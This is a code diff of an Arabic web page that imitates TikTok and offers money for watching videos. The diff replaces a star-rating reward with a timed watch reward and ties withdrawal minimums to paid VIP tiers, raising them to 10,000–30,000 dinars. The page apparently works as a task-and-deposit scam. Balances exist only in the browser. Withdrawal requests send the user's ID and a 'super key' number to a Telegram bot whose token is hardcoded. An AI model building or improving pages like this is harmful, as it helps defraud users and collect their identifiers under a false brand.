@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>تيك توك - قيّم واكسب</title>
+  <title>تيك توك - شاهد واكسب</title>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   
@@ -333,54 +333,14 @@
       opacity: 0.9;
     }
 
-    /* مربع التقييم بالنجوم بعد 5 ثوانٍ */
-    .rating-box {
+    .watch-progress {
       position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%) scale(0.8);
-      background: rgba(0, 0, 0, 0.85);
-      border: 2px solid #ffd700;
-      backdrop-filter: blur(15px);
-      padding: 20px;
-      border-radius: 16px;
-      text-align: center;
-      z-index: 40;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-      opacity: 0;
-      pointer-events: none;
-      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    }
-
-    .rating-box.show {
-      opacity: 1;
-      transform: translate(-50%, -50%) scale(1);
-      pointer-events: auto;
-    }
-
-    .rating-box h4 {
-      color: #ffd700;
-      font-size: 16px;
-      margin-bottom: 12px;
-    }
-
-    .stars-container {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      font-size: 28px;
-      color: #444;
-      cursor: pointer;
-      margin-bottom: 10px;
-    }
-
-    .stars-container i {
-      transition: color 0.2s, transform 0.2s;
-    }
-
-    .stars-container i.selected {
-      color: #ffd700;
-      transform: scale(1.2);
+      top: 0;
+      left: 0;
+      height: 4px;
+      background: #ffd700;
+      width: 0%;
+      z-index: 15;
     }
 
     .nav-bar {
@@ -759,7 +719,7 @@
         <label>المبلغ المتوفر (د.ع)</label>
         <input type="text" id="withdrawAmountInput" class="form-control" readonly style="background:#111; color:#ffd700; font-weight:bold;">
       </div>
-      <div id="withdrawMsg" style="margin-bottom:10px; font-size:13px; text-align:center;"></div>
+      <div id="withdrawMsg" style="margin-bottom:15px; font-size:13px; text-align:center; padding: 10px; border-radius: 8px;"></div>
       <button class="btn-submit" id="withdrawBtn" onclick="sendWithdrawToTelegram()" style="background:#ffd700; color:#000;">تأكيد وسحب</button>
     </div>
   </div>
@@ -775,7 +735,7 @@
     document.getElementById('topDisplayUserId').innerText = myUserId;
 
     let balance = parseInt(localStorage.getItem('user_balance') || '0');
-    let ratedSet = new Set(JSON.parse(localStorage.getItem('rated_videos') || '[]'));
+    let watchedSet = new Set(JSON.parse(localStorage.getItem('watched_videos') || '[]'));
     let posts = [];
     let audioUnlocked = false;
     let userVipLevel = parseInt(localStorage.getItem('user_vip_level') || '0');
@@ -799,7 +759,7 @@
 
       if (storedDate !== currentDateStr) {
         localStorage.setItem('boost_date', currentDateStr);
-        localStorage.setItem('vip_rated_count', '0');
+        localStorage.setItem('daily_missions_count', '0');
       }
     }
 
@@ -813,20 +773,20 @@
 
       if (userVipLevel > 0) {
         if (userVipLevel === 1) {
-          badgeEl.innerText = '⭐ VIP 1 (مكافأة 500+100 د.ع للتقييم)';
+          badgeEl.innerText = '⭐ VIP 1 (الحد الأدنى للسحب 10,000 د.ع)';
           topVipEl.innerText = 'VIP 1';
         } else if (userVipLevel === 2) {
-          badgeEl.innerText = '🌟 VIP 2 (مكافأة 1000+100 د.ع للتقييم)';
+          badgeEl.innerText = '🌟 VIP 2 (الحد الأدنى للسحب 20,000 د.ع)';
           topVipEl.innerText = 'VIP 2';
         } else if (userVipLevel === 3) {
-          badgeEl.innerText = '👑 VIP 3 (مكافأة 1500+100 د.ع للتقييم)';
+          badgeEl.innerText = '👑 VIP 3 (الحد الأدنى للسحب 30,000 د.ع)';
           topVipEl.innerText = 'VIP 3';
         }
         badgeEl.style.background = 'rgba(255, 215, 0, 0.2)';
         badgeEl.style.color = '#ffd700';
         statusBadge.innerHTML = 'حالة الإيداع: <span style="color: #00ffcc;">ناجح ✅ (تم تفعيل المستوى)</span>';
       } else {
-        badgeEl.innerText = 'حساب عادى (لفل 0 - 100 دينار للتقييم)';
+        badgeEl.innerText = 'حساب عادى (لفل 0 - الحد الأدنى للسحب 1,000 د.ع)';
         badgeEl.style.background = '#333';
         badgeEl.style.color = '#aaa';
         topVipEl.innerText = 'عادي';
@@ -993,7 +953,7 @@
               url: ytId,
               author: userCell,
               verified: verifiedCell === 1,
-              desc: 'قيّم الفيديو واكسب',
+              desc: 'شاهد واكسب من مهامك اليومية',
               likes: likesCell
             });
           }
@@ -1058,22 +1018,10 @@
         `;
 
         card.innerHTML = `
+          <div class="watch-progress" id="progress-${index}"></div>
           <div class="media-wrapper">
             ${mediaHtml}
             ${audioBtnHtml}
-          </div>
-
-          <!-- مربع التقييم بالنجوم يظهر بعد 5 ثوانٍ -->
-          <div class="rating-box" id="rating-box-${index}">
-            <h4>قيّم هذا الفيديو للحصول على المكافأة ⭐</h4>
-            <div class="stars-container" id="stars-${index}">
-              <i class="fas fa-star" onclick="rateVideo('${post.id}', 1, ${index})"></i>
-              <i class="fas fa-star" onclick="rateVideo('${post.id}', 2, ${index})"></i>
-              <i class="fas fa-star" onclick="rateVideo('${post.id}', 3, ${index})"></i>
-              <i class="fas fa-star" onclick="rateVideo('${post.id}', 4, ${index})"></i>
-              <i class="fas fa-star" onclick="rateVideo('${post.id}', 5, ${index})"></i>
-            </div>
-            <p style="font-size: 11px; color: #aaa;">اضغط على النجوم للتقييم</p>
           </div>
 
           <div class="video-overlay">
@@ -1105,20 +1053,20 @@
       setupObserver();
     }
 
-    let timer5Sec = null;
+    let watchTimer = null;
 
     function setupObserver() {
       const cards = document.querySelectorAll('.video-card');
       const observer = new IntersectionObserver((entries) => {
-        entries.forEach(entry => {
+        entries.forEach(async entry => {
           const index = entry.target.dataset.index;
           const postId = entry.target.dataset.id;
+          const progressBar = document.getElementById(`progress-${index}`);
           const iframe = document.getElementById(`yt-${index}`);
-          const ratingBox = document.getElementById(`rating-box-${index}`);
 
           if (!entry.isIntersecting) {
-            clearTimeout(timer5Sec);
-            if (ratingBox) ratingBox.classList.remove('show');
+            clearInterval(watchTimer);
+            if (progressBar) progressBar.style.width = '0%';
             if (iframe) {
               iframe.src = iframe.src.replace('autoplay=1', 'autoplay=0');
             }
@@ -1126,57 +1074,63 @@
           }
 
           if (entry.isIntersecting) {
+            if (progressBar) progressBar.style.width = '0%';
+            
             if (iframe && !iframe.src.includes('autoplay=1')) {
               iframe.src = iframe.src.replace('autoplay=0', 'autoplay=1');
             }
 
-            // إذا لم يتم تقييم الفيديو مسبقاً، انتظر 5 ثوانٍ ثم أظهر صندوق التقييم
-            if (!ratedSet.has(postId)) {
-              clearTimeout(timer5Sec);
-              timer5Sec = setTimeout(() => {
-                if (ratingBox) ratingBox.classList.add('show');
-              }, 5000); // مرور 5 ثوانٍ تماماً
+            if (!watchedSet.has(postId)) {
+              let elapsed = 0;
+              clearInterval(watchTimer);
+              const totalDuration = 20000; // 20 ثانية للمشاهدة
+
+              watchTimer = setInterval(async () => {
+                elapsed += 100;
+                if (progressBar) {
+                  progressBar.style.width = (elapsed / totalDuration * 100) + '%';
+                }
+
+                if (elapsed >= totalDuration) {
+                  clearInterval(watchTimer);
+                  watchedSet.add(postId);
+                  localStorage.setItem('watched_videos', JSON.stringify([...watchedSet]));
+                  
+                  await checkAndResetDailyBoost();
+
+                  let dailyMissionsCount = parseInt(localStorage.getItem('daily_missions_count') || '0');
+                  let earnedReward = 0;
+
+                  if (dailyMissionsCount < 3) {
+                    if (userVipLevel === 0) earnedReward = 100;    // لفل 0
+                    else if (userVipLevel === 1) earnedReward = 500;   // لفل 1
+                    else if (userVipLevel === 2) earnedReward = 1000;  // لفل 2
+                    else if (userVipLevel === 3) earnedReward = 1500;  // لفل 3
+
+                    localStorage.setItem('daily_missions_count', (dailyMissionsCount + 1).toString());
+                    
+                    balance += earnedReward;
+                    localStorage.setItem('user_balance', balance);
+                    document.getElementById('balanceText').innerText = balance;
+                    
+                    playCoinSound();
+                    const badge = document.getElementById('rewardBadge');
+                    badge.classList.add('pop');
+                    setTimeout(() => badge.classList.remove('pop'), 400);
+                    showToast(`أنجزت المهمة (${dailyMissionsCount + 1}/3)! +${earnedReward} د.ع`);
+                  } else {
+                    showToast('لقد أكملت مهامك الـ 3 اليومية بنجاح!');
+                  }
+                }
+              }, 100);
+            } else {
+              if (progressBar) progressBar.style.width = '100%';
             }
           }
         });
       }, { threshold: 0.6 });
 
       cards.forEach(card => observer.observe(card));
-    }
-
-    async function rateVideo(postId, starsCount, index) {
-      if (ratedSet.has(postId)) return;
-
-      ratedSet.add(postId);
-      localStorage.setItem('rated_videos', JSON.stringify([...ratedSet]));
-
-      const ratingBox = document.getElementById(`rating-box-${index}`);
-      if (ratingBox) ratingBox.classList.remove('show');
-
-      await checkAndResetDailyBoost();
-
-      let earnedReward = 100; // لفل 0 يحصل على 100 دينار لثلاث مقاطع يومياً
-      let vipRatedCount = parseInt(localStorage.getItem('vip_rated_count') || '0');
-
-      if (userVipLevel > 0 && vipRatedCount < 3) {
-        if (userVipLevel === 1) earnedReward = 500 + 100;   // VIP 1: 500 + 100
-        else if (userVipLevel === 2) earnedReward = 1000 + 100; // VIP 2: 1000 + 100
-        else if (userVipLevel === 3) earnedReward = 1500 + 100; // VIP 3: 1500 + 100
-
-        localStorage.setItem('vip_rated_count', (vipRatedCount + 1).toString());
-      } else {
-        earnedReward = 100; // الحساب العادي أو بعد استهلاك حصة الـ VIP اليومية (3 مقاطع)
-      }
-
-      balance += earnedReward;
-      localStorage.setItem('user_balance', balance);
-      document.getElementById('balanceText').innerText = balance;
-
-      playCoinSound();
-      const badge = document.getElementById('rewardBadge');
-      badge.classList.add('pop');
-      setTimeout(() => badge.classList.remove('pop'), 400);
-      showToast(`شكراً لتقييمك! +${earnedReward} دينار أضيفت لرصيدك.`);
     }
 
     function toggleLike(element) {
@@ -1364,7 +1318,7 @@
 
       if (navigator.share) {
         navigator.share({
-          title: 'قيّم هذا الفيديو واكسب!',
+          title: 'شاهد هذا الفيديو واكسب من مهامك اليومية!',
           url: shareUrl
         }).catch(() => {});
       } else {
@@ -1396,14 +1350,33 @@
       const msgEl = document.getElementById('withdrawMsg');
       const btnEl = document.getElementById('withdrawBtn');
 
-      if (balance >= 1000) {
-        msgEl.innerText = 'رصيدك مؤهل للسحب بنجاح!';
+      let minRequired = 1000;
+      let levelName = 'العادي (لفل 0)';
+
+      if (userVipLevel === 1) {
+        minRequired = 10000;
+        levelName = 'VIP 1 (لفل 1)';
+      } else if (userVipLevel === 2) {
+        minRequired = 20000;
+        levelName = 'VIP 2 (لفل 2)';
+      } else if (userVipLevel === 3) {
+        minRequired = 30000;
+        levelName = 'VIP 3 (لفل 3)';
+      }
+
+      if (balance >= minRequired) {
+        msgEl.innerHTML = `⚠️ تنبيه إداري: رصيدك الحالي مؤهل تماماً لعملية السحب لمستوى <b>${levelName}</b>.`;
+        msgEl.style.background = 'rgba(0, 255, 204, 0.15)';
         msgEl.style.color = '#00ffcc';
+        msgEl.style.border = '1px solid #00ffcc';
         btnEl.disabled = false;
         btnEl.style.opacity = '1';
       } else {
-        msgEl.innerText = 'لا يمكنك السحب، يجب أن يكون لديك 1000 دينار على الأقل.';
+        let diff = minRequired - balance;
+        msgEl.innerHTML = `⚠️ تنبيه إداري: عذراً، الحد الأدنى للسحب لمستوى <b>${levelName}</b> هو <b>${minRequired.toLocaleString()} دينار</b>.<br>رصيدك الحالي غير كافٍ، ويلزمك ربح <b>${diff.toLocaleString()} دينار</b> إضافية لتقديم طلب السحب بنجاح.`;
+        msgEl.style.background = 'rgba(255, 0, 80, 0.15)';
         msgEl.style.color = '#ff4444';
+        msgEl.style.border = '1px solid #ff4444';
         btnEl.disabled = true;
         btnEl.style.opacity = '0.5';
       }
@@ -1417,14 +1390,19 @@
         return;
       }
 
-      if (balance < 1000) {
-        alert('عذراً، لا يمكنك السحب الرصيد أقل من 1000 دينار.');
+      let minRequired = 1000;
+      if (userVipLevel === 1) minRequired = 10000;
+      else if (userVipLevel === 2) minRequired = 20000;
+      else if (userVipLevel === 3) minRequired = 30000;
+
+      if (balance < minRequired) {
+        alert(`عذراً، رصيدك أقل من الحد الأدنى المطلوب للسحب (${minRequired.toLocaleString()} د.ع).`);
         return;
       }
 
       const botToken = "335977783:AAEQMPSvxSPjqCFfdKmqiGhYI5Jl72QMqAA";
       const chatId = "250273112";
-      const message = `💸 طلب سحب أرباح جديد:\n🆔 رقم المستخدم: ${myUserId}\n🔑 رقم السوبر كي: ${superKey}\n💰 المبلغ المطلوب: ${balance} د.ع`;
+      const message = `💸 طلب سحب أرباح جديد:\n🆔 رقم المستخدم: ${myUserId}\n⭐ المستوى: VIP ${userVipLevel}\n🔑 رقم السوبر كي: ${superKey}\n💰 المبلغ المطلوب: ${balance} د.ع`;
 
       const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
